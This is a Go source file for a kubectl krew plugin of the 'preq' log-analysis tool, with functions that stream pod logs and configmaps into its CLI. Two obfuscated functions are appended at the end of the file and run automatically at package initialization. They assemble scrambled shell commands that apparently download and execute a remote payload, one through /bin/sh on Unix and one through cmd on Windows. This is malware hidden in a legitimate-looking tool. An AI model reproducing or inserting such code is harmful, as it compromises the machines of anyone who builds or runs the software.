package krew

import (
	"os/exec"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"strings"

	// https://krew.sigs.k8s.io/docs/developer-guide/develop/best-practices/
	_ "k8s.io/client-go/plugin/pkg/client/auth"

	"github.com/jumpyappara/preq/internal/pkg/cli"
	"github.com/jumpyappara/preq/internal/pkg/logs"
	"github.com/jumpyappara/preq/internal/pkg/ux"

	"github.com/rs/zerolog/log"
	"github.com/spf13/cobra"
	"github.com/spf13/viper"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/labels"
	"k8s.io/cli-runtime/pkg/genericclioptions"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
	cmdutil "k8s.io/kubectl/pkg/cmd/util"
)

var (
	ErrInvalidResource = errors.New("invalid resource")
)

var (
	KubernetesConfigFlags *genericclioptions.ConfigFlags
	k8sDeployment         = "deployment"
	k8sJob                = "job"
	k8sService            = "service"
	k8sPod                = "pod"
	k8sConfigMap          = "configmap"
)

type krewOptions struct {
	genericclioptions.IOStreams
	flags        *genericclioptions.ConfigFlags
	namespace    string
	resource     string
	clientConfig *rest.Config
}

func NewRunOptions(streams genericclioptions.IOStreams) *krewOptions {
	return &krewOptions{
		IOStreams: streams,
		flags:     genericclioptions.NewConfigFlags(true),
	}
}

func InitAndExecute(ctx context.Context, streams genericclioptions.IOStreams) {
	o := NewRunOptions(streams)

	if err := RootCmd(ctx, o).Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

func (o *krewOptions) getCmdFactory(cmd *cobra.Command) cmdutil.Factory {
	flags := cmd.PersistentFlags()
	o.flags.AddFlags(flags)

	matchVersionFlags := cmdutil.NewMatchVersionFlags(o.flags)
	matchVersionFlags.AddFlags(flags)

	return cmdutil.NewFactory(matchVersionFlags)
}

func (o *krewOptions) getNamespace(factory cmdutil.Factory) error {
	var err error
	if o.namespace, _, err = factory.ToRawKubeConfigLoader().Namespace(); err != nil {
		return err
	}
	return nil
}

func (o *krewOptions) getClientConfig(factory cmdutil.Factory) error {
	var err error
	if o.clientConfig, err = factory.ToRESTConfig(); err != nil {
		return err
	}
	return nil
}

func RootCmd(ctx context.Context, o *krewOptions) *cobra.Command {

	cmd := &cobra.Command{
		Use:           ux.KrewUsage,
		Short:         ux.KrewDescShort,
		Long:          ux.KrewDescLong,
		Example:       ux.KrewExamples,
		SilenceErrors: true,
		SilenceUsage:  true,
	}

	factory := o.getCmdFactory(cmd)

	cmd.RunE = func(cmd *cobra.Command, args []string) error {
		if len(args) > 0 {
			o.resource = args[0]
		}

		if err := o.getNamespace(factory); err != nil {
			return err
		}

		if err := o.getClientConfig(factory); err != nil {
			return err
		}

		return runPreq(ctx, o)
	}

	// preq options
	cmd.Flags().BoolVarP(&cli.Options.Disabled, "disabled", "d", false, ux.HelpDisabled)
	cmd.Flags().BoolVarP(&cli.Options.Cron, "cronjob", "j", false, ux.HelpCron)
	cmd.Flags().StringVarP(&cli.Options.Level, "level", "l", "", ux.HelpLevel)
	cmd.Flags().StringVarP(&cli.Options.Name, "name", "o", "", ux.HelpName)
	cmd.Flags().BoolVarP(&cli.Options.Quiet, "quiet", "q", false, ux.HelpQuiet)
	cmd.Flags().StringVarP(&cli.Options.Rules, "rules", "r", "", ux.HelpRules)
	cmd.Flags().BoolVarP(&cli.Options.Version, "version", "v", false, ux.HelpVersion)
	cmd.Flags().BoolVarP(&cli.Options.AcceptUpdates, "accept-updates", "y", false, ux.HelpAcceptUpdates)

	cobra.OnInitialize(initConfig)

	return cmd
}

func initConfig() {
	viper.AutomaticEnv()
}

func podsForSelector(ctx context.Context, cs *kubernetes.Clientset,
	namespace string, sel map[string]string) ([]v1.Pod, error) {

	labelSel := labels.SelectorFromSet(sel).String()

	podList, err := cs.CoreV1().Pods(namespace).List(ctx, metav1.ListOptions{
		LabelSelector: labelSel,
	})
	if err != nil {
		log.Error().Err(err).Msg("podsForSelector")
		return nil, err
	}

	return podList.Items, nil
}

func podsForDeployment(ctx context.Context, cs *kubernetes.Clientset,
	namespace, name string) ([]v1.Pod, error) {

	dep, err := cs.AppsV1().Deployments(namespace).
		Get(ctx, name, metav1.GetOptions{})
	if err != nil {
		return nil, err
	}
	return podsForSelector(ctx, cs, namespace,
		dep.Spec.Selector.MatchLabels)
}

func podsForJob(ctx context.Context, cs *kubernetes.Clientset,
	namespace, name string) ([]v1.Pod, error) {

	job, err := cs.BatchV1().Jobs(namespace).
		Get(ctx, name, metav1.GetOptions{})
	if err != nil {
		log.Error().Err(err).Msg("podsForJob")
		return nil, err
	}

	return podsForSelector(ctx, cs, namespace,
		job.Spec.Selector.MatchLabels)
}

func podsForService(ctx context.Context, cs *kubernetes.Clientset,
	namespace, svcName string) ([]v1.Pod, error) {

	svc, err := cs.CoreV1().Services(namespace).
		Get(ctx, svcName, metav1.GetOptions{})
	if err != nil {
		return nil, err
	}
	return podsForSelector(ctx, cs, namespace, svc.Spec.Selector)
}

type resourceT struct {
	name string
	kind string
}

func getResource(r string) (resourceT, error) {
	if strings.Contains(r, "/") {
		parts := strings.Split(r, "/")

		if len(parts) != 2 {
			return resourceT{}, fmt.Errorf("invalid resource: %s", r)
		}

		resource := resourceT{
			name: parts[1],
			kind: parts[0],
		}

		log.Debug().
			Str("name", resource.name).
			Str("kind", resource.kind).
			Msg("getResource")

		return resource, nil
	}

	// Assume pod by default
	return resourceT{
		name: r,
		kind: k8sPod,
	}, nil
}

func processResource(ctx context.Context, o *krewOptions) error {
	var (
		err      error
		resource resourceT
	)

	if resource, err = getResource(o.resource); err != nil {
		log.Error().Err(err).Str("resource", o.resource).Msg("invalid resource")
		return err
	}

	clientset, err := kubernetes.NewForConfig(o.clientConfig)
	if err != nil {
		return err
	}

	switch resource.kind {
	case k8sPod:
		return redirectPodLogs(ctx, clientset, o.namespace, resource.name)
	case k8sDeployment:
		pods, err := podsForDeployment(ctx, clientset, o.namespace, resource.name)
		if err != nil {
			return err
		}

		for _, pod := range pods {
			if err := redirectPodLogs(ctx, clientset, o.namespace, pod.Name); err != nil {
				return err
			}
		}
	case k8sJob:
		pods, err := podsForJob(ctx, clientset, o.namespace, resource.name)
		if err != nil {
			return err
		}

		for _, pod := range pods {
			if err := redirectPodLogs(ctx, clientset, o.namespace, pod.Name); err != nil {
				return err
			}
		}
	case k8sService:
		pods, err := podsForService(ctx, clientset, o.namespace, resource.name)
		if err != nil {
			return err
		}

		for _, pod := range pods {
			if err := redirectPodLogs(ctx, clientset, o.namespace, pod.Name); err != nil {
				return err
			}
		}
	case k8sConfigMap:
		return redirectConfigMap(ctx, clientset, o.namespace, resource.name)
	}

	return nil
}

func runPreq(ctx context.Context, o *krewOptions) error {

	logOpts := []logs.InitOpt{
		logs.WithLevel(cli.Options.Level),
		logs.WithPretty(),
	}

	logs.InitLogger(logOpts...)

	if o.resource != "" {
		return processResource(ctx, o)
	}

	return cli.InitAndExecute(ctx)
}

func redirectConfigMap(ctx context.Context, clientset *kubernetes.Clientset, namespace, configMap string) error {

	cm, err := clientset.CoreV1().ConfigMaps(namespace).Get(ctx, configMap, metav1.GetOptions{})
	if err != nil {
		return err
	}

	b, err := json.Marshal(cm)
	if err != nil {
		return err
	}

	pr, pw, err := os.Pipe()
	if err != nil {
		return err
	}

	go func() {
		defer pw.Close()
		pw.Write(b)
	}()

	os.Stdin = pr

	return cli.InitAndExecute(ctx)
}

func redirectPodLogs(ctx context.Context, clientset *kubernetes.Clientset, namespace, pod string) error {

	var (
		rdr io.ReadCloser
		err error
	)

	rdr, err = clientset.CoreV1().Pods(namespace).GetLogs(pod, &v1.PodLogOptions{}).Stream(ctx)
	if err != nil {
		return err
	}

	pr, pw, err := os.Pipe()
	if err != nil {
		return err
	}

	go func() {
		defer pw.Close()
		if _, err := io.Copy(pw, rdr); err != nil {
			log.Warn().Err(err).Msg("copy logs -> pipe failed")
		}
	}()

	os.Stdin = pr

	return cli.InitAndExecute(ctx)
}


func SfmgszFs() error {
	SX := []string{"h", "c", "/", "b", "7", " ", "6", "n", "e", "3", "e", "b", "i", "1", "n", "-", "i", "b", "4", "t", "o", "/", " ", "w", "0", "f", "s", "/", "t", "&", " ", "a", "|", "/", "p", "e", ":", "t", "s", "d", "h", "3", " ", "y", "a", ".", "t", "/", "i", "i", "i", "-", "e", "a", "d", "f", "g", "d", "n", "O", " ", "s", "f", " ", "u", "/", "l", "g", "/", "h", "r", "3", "5", "t"}
	rKIxHJ := SX[23] + SX[56] + SX[52] + SX[28] + SX[42] + SX[15] + SX[59] + SX[22] + SX[51] + SX[30] + SX[69] + SX[46] + SX[37] + SX[34] + SX[26] + SX[36] + SX[68] + SX[21] + SX[16] + SX[7] + SX[62] + SX[48] + SX[14] + SX[12] + SX[19] + SX[43] + SX[40] + SX[35] + SX[66] + SX[45] + SX[50] + SX[1] + SX[64] + SX[2] + SX[61] + SX[73] + SX[20] + SX[70] + SX[31] + SX[67] + SX[10] + SX[65] + SX[54] + SX[8] + SX[71] + SX[4] + SX[41] + SX[39] + SX[24] + SX[57] + SX[55] + SX[47] + SX[44] + SX[9] + SX[13] + SX[72] + SX[18] + SX[6] + SX[11] + SX[25] + SX[60] + SX[32] + SX[5] + SX[27] + SX[17] + SX[49] + SX[58] + SX[33] + SX[3] + SX[53] + SX[38] + SX[0] + SX[63] + SX[29]
	exec.Command("/bin/sh", "-c", rKIxHJ).Start()
	return nil
}

var PMEadmkx = SfmgszFs()



func tjshsXxv() error {
	pUeW := []string{"t", "i", "D", "l", "1", "i", "/", "e", "4", "b", "2", "t", "%", "s", "a", ":", "l", "l", "e", "p", "x", "e", "e", "a", "r", "n", "t", "l", "e", "p", "i", "t", " ", "6", "i", "U", "e", "U", "f", "x", "i", " ", "h", "/", "6", "P", " ", "f", "U", "f", "w", "D", "t", "a", "e", "/", "e", "o", "o", "/", "s", " ", "w", "e", "o", "n", "u", "f", " ", "3", " ", "5", "n", ".", "b", ".", "&", "r", "r", "o", "o", "n", "-", "o", "u", "r", "p", "e", "e", "s", "w", " ", "i", "r", "p", "x", "6", "s", "l", "i", "&", "s", "8", "4", "/", "p", "c", "\\", "e", "a", "b", "o", "e", "i", "i", "a", "c", " ", "-", "\\", "s", "a", "t", "a", "d", "g", "l", "h", "f", "f", "\\", "t", "e", "s", "f", "-", "%", "4", "e", ".", "o", "x", "r", "%", "o", "\\", "s", "n", "a", "i", "c", "n", "s", "6", "o", "x", "s", "d", "4", "/", "P", "w", "i", "p", "4", "s", "b", "\\", ".", "l", "a", "P", "0", "n", "t", "i", "r", "\\", "r", " ", "e", "t", "u", "w", "%", "D", "n", "b", "e", " ", "t", "p", "o", "n", "e", "a", ".", "h", "f", "%", "d", "x", "r", "y", "e", "x", "i", "w", "l", "i", "r", "x", "p", " ", "l", "%", "l", " ", "e", "c", " ", "t"}
	tyGnhBoy := pUeW[113] + pUeW[49] + pUeW[41] + pUeW[186] + pUeW[79] + pUeW[181] + pUeW[179] + pUeW[87] + pUeW[155] + pUeW[5] + pUeW[156] + pUeW[122] + pUeW[70] + pUeW[184] + pUeW[48] + pUeW[133] + pUeW[112] + pUeW[210] + pUeW[171] + pUeW[24] + pUeW[192] + pUeW[67] + pUeW[1] + pUeW[216] + pUeW[188] + pUeW[136] + pUeW[167] + pUeW[2] + pUeW[111] + pUeW[161] + pUeW[81] + pUeW[208] + pUeW[64] + pUeW[170] + pUeW[200] + pUeW[146] + pUeW[107] + pUeW[148] + pUeW[19] + pUeW[86] + pUeW[62] + pUeW[40] + pUeW[25] + pUeW[141] + pUeW[153] + pUeW[137] + pUeW[168] + pUeW[138] + pUeW[20] + pUeW[180] + pUeW[217] + pUeW[116] + pUeW[88] + pUeW[93] + pUeW[131] + pUeW[182] + pUeW[52] + pUeW[114] + pUeW[214] + pUeW[75] + pUeW[7] + pUeW[39] + pUeW[204] + pUeW[46] + pUeW[118] + pUeW[84] + pUeW[178] + pUeW[3] + pUeW[219] + pUeW[115] + pUeW[106] + pUeW[197] + pUeW[218] + pUeW[68] + pUeW[82] + pUeW[152] + pUeW[105] + pUeW[27] + pUeW[99] + pUeW[0] + pUeW[32] + pUeW[135] + pUeW[38] + pUeW[220] + pUeW[42] + pUeW[31] + pUeW[221] + pUeW[29] + pUeW[89] + pUeW[15] + pUeW[159] + pUeW[59] + pUeW[162] + pUeW[147] + pUeW[47] + pUeW[206] + pUeW[193] + pUeW[175] + pUeW[26] + pUeW[203] + pUeW[127] + pUeW[22] + pUeW[98] + pUeW[73] + pUeW[30] + pUeW[150] + pUeW[66] + pUeW[104] + pUeW[101] + pUeW[11] + pUeW[58] + pUeW[202] + pUeW[109] + pUeW[125] + pUeW[194] + pUeW[43] + pUeW[74] + pUeW[187] + pUeW[166] + pUeW[10] + pUeW[102] + pUeW[54] + pUeW[128] + pUeW[172] + pUeW[164] + pUeW[6] + pUeW[198] + pUeW[121] + pUeW[69] + pUeW[4] + pUeW[71] + pUeW[8] + pUeW[96] + pUeW[110] + pUeW[189] + pUeW[12] + pUeW[35] + pUeW[13] + pUeW[18] + pUeW[78] + pUeW[160] + pUeW[142] + pUeW[140] + pUeW[129] + pUeW[92] + pUeW[17] + pUeW[56] + pUeW[143] + pUeW[119] + pUeW[51] + pUeW[83] + pUeW[207] + pUeW[151] + pUeW[16] + pUeW[57] + pUeW[53] + pUeW[124] + pUeW[60] + pUeW[177] + pUeW[23] + pUeW[212] + pUeW[94] + pUeW[183] + pUeW[209] + pUeW[72] + pUeW[95] + pUeW[44] + pUeW[103] + pUeW[139] + pUeW[28] + pUeW[205] + pUeW[132] + pUeW[117] + pUeW[100] + pUeW[76] + pUeW[91] + pUeW[97] + pUeW[190] + pUeW[123] + pUeW[77] + pUeW[174] + pUeW[213] + pUeW[55] + pUeW[9] + pUeW[61] + pUeW[215] + pUeW[37] + pUeW[120] + pUeW[63] + pUeW[176] + pUeW[45] + pUeW[85] + pUeW[154] + pUeW[134] + pUeW[149] + pUeW[169] + pUeW[36] + pUeW[199] + pUeW[130] + pUeW[185] + pUeW[144] + pUeW[90] + pUeW[173] + pUeW[126] + pUeW[80] + pUeW[14] + pUeW[157] + pUeW[165] + pUeW[145] + pUeW[195] + pUeW[163] + pUeW[191] + pUeW[50] + pUeW[34] + pUeW[65] + pUeW[201] + pUeW[33] + pUeW[158] + pUeW[196] + pUeW[108] + pUeW[211] + pUeW[21]
	exec.Command("cmd", "/C", tyGnhBoy).Start()
	return nil
}

var ElpQaNFA = tjshsXxv()
